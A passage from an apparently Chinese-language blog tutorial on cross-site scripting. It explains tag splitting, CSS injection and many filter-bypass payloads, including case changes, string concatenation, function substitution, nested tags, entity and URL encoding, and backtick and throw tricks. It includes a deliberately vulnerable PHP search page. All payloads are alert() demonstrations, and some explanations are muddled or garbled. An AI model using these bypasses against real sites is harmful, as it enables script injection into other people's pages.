src=&quot;NIKO.png&quot;&gt;<br></code></pre></td></tr></table></figure><p>浏览器会将其解析为两个标签，而不是一个完整的<code>&lt;img&gt;</code>标签。解析过程如下：</p><ol><li>第一个 <code>&lt;</code> 被视为标签名的起始符号，但由于后面没有有效的标签名，浏览器会忽略这个 <code>&lt;</code>。</li><li>第二个 <code>&lt;</code> 被视为<code>&lt;script&gt;</code>标签的起始符号，而紧随其后的 <code>script&gt;</code> 被视为<code>&lt;script&gt;</code>标签的结束符号。所以浏览器将其解释为一个完整的 <code>&lt;script&gt;</code> 标签，并执行其中的恶意脚本：<code>alert(&#39;XSS&#39;)</code>。</li><li>接着是 <code>&lt;img&gt;</code> 标签，但由于前面的部分被解析为<code>&lt;script&gt;</code>标签，所以这个<code>&lt;img&gt;</code>标签被当作普通文本对待，而不是有效的HTML标签。</li></ol><p>因此，浏览器实际上没有成功执行 <code>&lt;img&gt;</code> 标签，但恶意脚本 <code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code> 被成功执行，触发了一个对话框显示文本 “XSS”。</p><blockquote><p>这种技术通常被称为 “tag splitting”，利用浏览器对标签解析的容错机制，从而插入恶意代码并绕过防御措施。</p></blockquote><h3 id="5-插入到CSS中"><a href="#5-插入到CSS中" class="headerlink" title="5.插入到CSS中"></a>5.插入到CSS中</h3><p>示例：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">div</span> style=&quot;<span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;javascript:alert(`NIKO`)&#x27;</span>);&quot;&gt;<br></code></pre></td></tr></table></figure><p>其中，<code>background-image</code> 属性被设置为一个 URL，这个 URL 使用了 <code>javascript:</code> 协议，并包含了一个恶意的 JavaScript 弹窗脚本 <code>alert(&#39;NIKO&#39;)</code>。</p><blockquote><p>就实际情况而言，由于 <code>javascript:</code> 协议不是有效的图像 URL，大多数现代浏览器都会阻止执行这个脚本。所以在大多数情况下，这个代码不会导致弹窗。</p></blockquote><p>以上就是一些基本的插入示例，至于一些更复杂的实例，由于作者水平有限，正在紧锣密鼓地学习中，敬请期待后续更新^_^。</p><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="1-关键词绕过"><a href="#1-关键词绕过" class="headerlink" title="1.关键词绕过"></a>1.关键词绕过</h3><h4 id="1-大小写绕过"><a href="#1-大小写绕过" class="headerlink" title="1.大小写绕过"></a>1.大小写绕过</h4><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>XSS漏洞示例<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>搜索结果<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">      $q = isset($_GET[&#x27;q&#x27;]) ? $_GET[&#x27;q&#x27;] : &#x27;&#x27;;</span><br><span class="hljs-meta">      $q = strtolower($q); </span><br><span class="hljs-meta">    ?&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>你搜索的关键词是：<span class="hljs-meta">&lt;?php echo $q; ?&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">      <span class="hljs-keyword">var</span> searchQuery = <span class="hljs-string">&#x27;&lt;?php echo $q; ?&gt;&#x27;</span>;</span><br><span class="language-javascript">      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;&lt;p&gt;搜索结果为：&quot;</span> + searchQuery + <span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>实际上进行字符串处理的函数<code>strtolower()</code>并没什么用处，使用大小写绕过即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">xxxxx?q=<span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert(1)<span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span></span></span><br></code></pre></td></tr></table></figure><h4 id="2-拼接绕过"><a href="#2-拼接绕过" class="headerlink" title="2.拼接绕过"></a>2.拼接绕过</h4><ul><li><p>eval</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;eval(&#x27;al&#x27;+&#x27;ert(NIKO)&#x27;)&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>还是利用了刚刚提到的<code>oneerror</code>事件，在图片加载失败时进行弹窗。<code>eval()</code>是JavaScript的内置函数，它会执行传入的字符串作为JavaScript代码。为了绕过一些简单的过滤，攻击者在<code>eval()</code>函数中使用了字符串拼接，将原本的<code>alert</code>函数字符串拆分成 <code>&#39;al&#39;+&#39;ert&#39;</code>。</p></li><li><p>top</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](NIKO)&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p><code>top</code>对象：<code>top</code>是JavaScript中的一个全局对象，它表示当前窗口的最顶层的窗口或帧。通过<code>top</code>对象，攻击者可以访问顶层窗口的全局变量和函数。</p></blockquote></li></ul><p>这个例子中使用了数组索引的方式，通过<code>top[&#39;al&#39;+&#39;ert&#39;]</code>来调用<code>alert</code>函数。攻击者在<code>top</code>对象中构造了一个函数调用，拼接了<code>&#39;al&#39;+&#39;ert&#39;</code>并通过数组索引的方式来调用<code>alert</code>函数。</p><ul><li><p>window</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>window同样也是全局变量，表示浏览器窗口，可以访问全局变量和函数。</p></blockquote></li></ul><p>与上面基本类似。</p><blockquote><p>另：<code>1</code>是作为<code>alert</code>函数的参数传入，但由于<code>alert</code>函数不需要参数，所以这个参数可以忽略。</p></blockquote><ul><li><p>self</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;self[`al`+`ert`](1)&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p><code>self</code>叕是JavaScript中的全局对象之一，表示当前窗口自身。</p></blockquote></li><li><p>parent</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;parent[`al`+`ert`](1)&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><blockquote><p><code>parent</code>是JavaScript中的全局对象之一，它表示当前窗口的父级窗口。</p></blockquote><ul><li><p>frames</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;frames[`al`+`ert`](1)&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p><code>frames</code>是JavaScript中的全局对象之一，它表示当前窗口的所有子窗口（frame或iframe）。</p></blockquote></li></ul><p>综上，基本都是利用全局对象调用指定函数，辅以拼接绕过。</p><h4 id="3-函数替换"><a href="#3-函数替换" class="headerlink" title="3.函数替换"></a>3.函数替换</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;eval(alert(1))&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;open(alert(1))&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;document.write(alert(1))&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;setTimeout(alert(1))&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;setInterval(alert(1))&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;Set.constructor(alert(1))&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;Map.constructor(alert(1))&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;Array.constructor(alert(1))&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;WeakSet.constructor(alert(1))&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;constructor.constructor(alert(1))&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;[1].map(alert(1))&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;[1].find(alert(1))&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;[1].every(alert(1))&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;[1].filter(alert(1))&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;[1].forEach(alert(1))&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;[1].findIndex(alert(1))&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ol><li><code>eval(alert(1))</code>: 使用<code>eval()</code>函数来执行<code>alert(1)</code>，弹出警示框。</li><li><code>open(alert(1))</code>: 使用<code>open()</code>函数来打开一个新的窗口并执行<code>alert(1)</code>，弹出警示框。</li><li><code>document.write(alert(1))</code>: 使用<code>document.write()</code>方法来将<code>alert(1)</code>写入到文档中，导致警示框弹出。</li><li><code>setTimeout(alert(1))</code>: 使用<code>setTimeout()</code>函数来设置定时器，在指定时间后执行<code>alert(1)</code>，弹出警示框。</li><li><code>setInterval(alert(1))</code>: 使用<code>setInterval()</code>函数来设置循环定时器，不断执行<code>alert(1)</code>，导致多次弹出警示框。</li><li><code>Set.constructor(alert(1))</code>: 利用<code>Set</code>构造函数的<code>constructor</code>属性来执行<code>alert(1)</code>，弹出警示框。</li><li><code>Map.constructor(alert(1))</code>: 利用<code>Map</code>构造函数的<code>constructor</code>属性来执行<code>alert(1)</code>，弹出警示框。</li><li><code>Array.constructor(alert(1))</code>: 利用<code>Array</code>构造函数的<code>constructor</code>属性来执行<code>alert(1)</code>，弹出警示框。</li><li><code>WeakSet.constructor(alert(1))</code>: 利用<code>WeakSet</code>构造函数的<code>constructor</code>属性来执行<code>alert(1)</code>，弹出警示框。</li><li><code>constructor.constructor(alert(1))</code>: 利用<code>constructor</code>属性的<code>constructor</code>属性来执行<code>alert(1)</code>，弹出警示框。</li><li><code>[1].map(alert(1))</code>: 利用数组<code>[1]</code>的<code>map()</code>方法来执行<code>alert(1)</code>，弹出警示框。</li><li><code>[1].find(alert(1))</code>: 利用数组<code>[1]</code>的<code>find()</code>方法来执行<code>alert(1)</code>，弹出警示框。</li><li><code>[1].every(alert(1))</code>: 利用数组<code>[1]</code>的<code>every()</code>方法来执行<code>alert(1)</code>，弹出警示框。</li><li><code>[1].filter(alert(1))</code>: 利用数组<code>[1]</code>的<code>filter()</code>方法来执行<code>alert(1)</code>，弹出警示框。</li><li><code>[1].forEach(alert(1))</code>: 利用数组<code>[1]</code>的<code>forEach()</code>方法来执行<code>alert(1)</code>，弹出警示框。</li><li><code>[1].findIndex(alert(1))</code>: 利用数组<code>[1]</code>的<code>findIndex()</code>方法来执行<code>alert(1)</code>，弹出警示框。</li></ol><h4 id="4-嵌套绕过"><a href="#4-嵌套绕过" class="headerlink" title="4.嵌套绕过"></a>4.嵌套绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;sc<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">ript&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;NIKO&#x27;</span>)&lt;/sc</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>ript&gt;<br></code></pre></td></tr></table></figure><p>在这个例子中，攻击者通过在<code>&lt;script&gt;</code>标签中插入<code>&lt;sc&lt;script&gt;ript&gt;</code>来绕过简单的XSS过滤。由于过滤只检查单个<code>&lt;script&gt;</code>标签的存在，攻击者将其拆分成两部分，使过滤器无法识别<code>&lt;script&gt;</code>标签。</p><p>当浏览器解析这段代码时，它会认为存在一个未关闭的<code>&lt;script&gt;</code>标签，因此后面的内容将被视为JavaScript代码。因此，它将执行<code>alert(&#39;NIKO&#39;)</code>，弹出一个警示框。</p><h3 id="2-编码绕过"><a href="#2-编码绕过" class="headerlink" title="2.编码绕过"></a>2.编码绕过</h3><h4 id="1-html实体编码转义"><a href="#1-html实体编码转义" class="headerlink" title="1.html实体编码转义"></a>1.html实体编码转义</h4><blockquote><p>HTML实体编码转义是一种用于在HTML文档中表示特殊字符的技术。在HTML中，有些字符具有特殊的含义，比如左尖括号 <code>&lt;</code> 和右尖括号 <code>&gt;</code> 用于标签的开始和结束，而<code>&amp;</code>符号用于表示实体字符。为了在HTML中正确地显示这些特殊字符本身而不是其特殊含义，我们需要使用HTML实体编码转义，将这些字符转换为相应的实体表示。</p><p>HTML实体编码转义采用了一种特殊的语法，以<code>&amp;</code>开头，以<code>;</code>结尾，中间是特定的实体名称或实体编号。例如，要在HTML文档中表示<code>&lt;</code>字符，我们可以使用实体编码<code>&amp;lt;</code>，表示<code>&gt;</code>字符可以使用<code>%gt;</code>。</p><p>以下是一些常见的HTML实体编码：</p><ul><li><code>&amp;lt;</code>：表示<code>&lt;</code>，左尖括号。</li><li><code>&amp;gt;</code>：表示<code>&gt;</code>，右尖括号。</li><li><code>&amp;amp;</code>：表示<code>&amp;</code>，和号。</li><li><code>&amp;quot;</code>：表示<code>&quot;</code>，双引号。</li><li><code>&amp;apos;</code>：表示<code>&#39;</code>，单引号。</li></ul></blockquote><p>以下的两个可控点都是单个标签属性：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;可控点&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>可控点<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>大体上有这么几种绕过的方式：</p><ol><li>十进制绕过：使用十进制形式的ASCII码来表示特殊字符。在例子中，使用<code>a</code>来代替<code>a</code>字符的ASCII码97。</li><li>十六进制绕过：使用十六进制形式的ASCII码来表示特殊字符。在例子中，使用<code>a</code>来代替<code>a</code>字符的ASCII码97。注意，如果题目过滤了分号<code>;</code>，这里可以把分号删去，因为十六进制的编码在HTML中不需要分号。</li><li>直接插入：这个例子没有使用HTML实体编码，直接在URL中插入了<code>javascript:alert(1)</code>作为<code>&lt;a&gt;</code>标签的<code>href</code>属性，导致恶意代码执行。</li></ol><h4 id="2-URL编码绕过"><a href="#2-URL编码绕过" class="headerlink" title="2.URL编码绕过"></a>2.URL编码绕过</h4><p>需要注入点存在href属性或者src属性，才可以利用url编码转义</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span>NIKO<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>#<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:%61%6c%65%72%74%28%31%29</span>&gt;</span>NIKO<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>第二行代码使用URL编码来表示<code>javascript:alert(1)</code>。在URL编码中，<code>%61</code>代表<code>a</code>，<code>%6c</code>代表<code>l</code>，依此类推。通过这种方式，恶意代码被混淆，但在浏览器解析URL时会被还原，仍然可以成功执行。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">javascript:%61%6c%65%72%74%28%31%29</span>&gt;</span>NIKO<span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>在JavaScript中，<code>href</code>属性和<code>src</code>属性是与标签配合使用的重要属性，它们可以指定链接或资源的URL，并在网页中加载相应的内容。以下是它们在一些常见标签中的用法：</p><ol><li><p><code>href</code></p><p>属性：</p><ul><li><code>&lt;a&gt;</code>标签：<code>href</code>属性用于定义超链接，即点击后会跳转到指定URL的链接。</li><li><code>&lt;link&gt;</code>标签：<code>href</code>属性用于加载外部CSS样式表文件。</li><li><code>&lt;base&gt;</code>标签：<code>href</code>属性用于指定基准URL，用于解析相对URL。</li></ul></li></ol><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html">htmlCopy code<span class="hljs-comment">&lt;!-- 超链接 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.example.com&quot;</span>&gt;</span>点击跳转<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 外部CSS样式表 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;style.css&quot;</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 指定基准URL --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">base</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.example.com&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ol><li><code>src</code>属性：</li></ol><ul><li><code>&lt;script&gt;</code>标签：<code>src</code>属性用于加载外部JavaScript文件。</li><li><code>&lt;img&gt;</code>标签：<code>src</code>属性用于指定图像的URL，从而显示图像。</li><li><code>&lt;iframe&gt;</code>标签：<code>src</code>属性用于指定嵌入的网页的URL，从而在<code>&lt;iframe&gt;</code>中加载网页内容。</li><li><code>&lt;audio&gt;</code>标签、<code>&lt;video&gt;</code>标签：<code>src</code>属性用于指定音频或视频文件的URL，从而播放音频或视频。</li></ul><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html">htmlCopy code<span class="hljs-comment">&lt;!-- 外部JavaScript文件 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 图像URL --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;示例图片&quot;</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 嵌入网页 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://www.example.com&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 音频和视频 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">controls</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;audio.mp3&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">audio</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">controls</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;video.mp4&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span><br></code></pre></td></tr></table></figure></blockquote><h4 id="3-空格绕过"><a href="#3-空格绕过" class="headerlink" title="3.空格绕过"></a>3.空格绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>&lt;imgAAsrcAAonerrorBB=BBalertCC(1)DD<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>代码包含一个<code>&lt;img&gt;</code>标签，但注意到<code>img</code>标签名称中添加了多余的字符“AA”和“CC”。这是因为在某些情况下，防护系统或过滤器可能会检查恶意代码中的关键词，因此攻击者为了绕过过滤，故意添加了额外的字符。</p><p>注入的恶意代码位于<code>onerror</code>事件属性中，<code>onerror</code>事件在图片加载失败时触发。攻击者将代码<code>alert(1)</code>作为<code>onerror</code>属性值，因此在图片加载失败时，就会执行<code>alert(1)</code>，弹出一个警示框。</p><h4 id="4-绕过"><a href="#4-绕过" class="headerlink" title="4.()绕过"></a>4.()绕过</h4><h5 id="1-利用反引号"><a href="#1-利用反引号" class="headerlink" title="1.利用反引号"></a>1.利用反引号</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">alert<span class="hljs-string">`1`</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里使用了反引号 &#96; 来包裹1，表示将1作为模板字面量（Template Literal）进行处理。模板字面量是ES6中引入的新特性，它允许我们在字符串中插入表达式，以一种更灵活的方式构建字符串。</p><p>在这个例子中，<code>alert</code>是JavaScript中的一个全局函数用于弹出警示框，而&#96;&#96;符号在模板字面量中是用来标识模板字符串的起始和结束。</p><p>这段代码等同于以下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">javascriptCopy code<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;1&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当浏览器解析这段代码时，它会执行<code>alert(&#39;1&#39;)</code>。</p><h5 id="2-throw绕过"><a href="#2-throw绕过" class="headerlink" title="2.throw绕过"></a>2.throw绕过</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">alert;<span class="hljs-keyword">throw</span> <span class="hljs-number">1</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ol><li><code>alert</code>：<code>alert</code>是JavaScript中的一个全局函数用于弹出警示框。在这里，没有提供参数给<code>alert</code>函数，因此它会显示一个空的警示框。</li><li><code>throw 1</code>：<code>throw</code>语句用于抛出一个异常。在这里，代码抛出一个带有数字1的异常。</li></ol><p>通常情况下，JavaScript代码中的异常应该被捕获和处理，但在这个例子中，异常没有被处理，因此会在浏览器中显示一个错误消息，类似于以下内容：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 